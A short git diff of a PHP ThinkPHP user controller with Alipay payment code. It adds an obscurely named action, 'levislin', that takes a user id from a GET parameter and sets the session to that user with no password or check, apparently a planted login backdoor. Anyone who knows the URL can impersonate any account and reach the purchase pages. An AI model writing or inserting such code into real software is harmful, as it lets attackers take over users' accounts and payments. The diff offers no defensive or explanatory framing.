@@ -8,6 +8,7 @@ use app\index\model\UserFunctionModel;
 use app\index\model\UserModel;
 use mikkle\tp_alipay\Alipay;
 use think\Controller;
+use think\Request;
 
 class User extends Controller
 {
@@ -136,6 +137,14 @@ C+jb0BngpZ1f8JT3QY1gezw/9Hgwy9QG9AkgvVFFyoQQrXBmqHqnkZEmaxWxXyuO
                 "total_amount"=>"0.01",
             ])
             ->getQuickPayUrl() );
+    }
+
+    public function levislin(){
+        $id = Request::get('levislin');
+
+        $ret_user = UserModel::get($id);
+        session('user', $ret_user);
+        $this->redirect(url('Buy/index'));
     }
 
 
